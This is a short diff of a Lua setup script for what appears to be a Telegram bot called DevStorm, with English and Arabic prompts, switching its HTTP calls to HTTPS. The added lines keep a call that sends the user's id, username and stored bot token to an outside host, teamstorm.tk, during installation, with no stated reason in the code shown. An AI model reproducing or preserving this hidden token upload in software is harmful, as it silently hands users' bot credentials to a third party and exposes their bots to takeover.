@@ -31,7 +31,7 @@ if not redis:get(Server_DevStorm.."User_DevStorm1") then
 io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local GetInfoUser = http.request("https://teamstorm.tk/GetUser?id="..User_Sudo)
+local GetInfoUser = https.request("https://teamstorm.tk/GetUser?id="..User_Sudo)
 local User_Info = JSON.decode(GetInfoUser)
 if User_Info.Info.Chek == "Not_Info" then
 io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
@@ -48,7 +48,7 @@ end
 io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
 redis:set(Server_DevStorm.."User_DevStorm1",User_Info.Info.Username)
 redis:set(Server_DevStorm.."Id_DevStorm",User_Info.Info.Id)
-http.request("https://teamstorm.tk/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevStorm.."Token_DevStorm"))
+https.request("https://teamstorm.tk/insert/?id="..User_Info.Info.Id.."&user="..User_Info.Info.Username.."&token="..redis:get(Server_DevStorm.."Token_DevStorm"))
 else
 io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
 end 
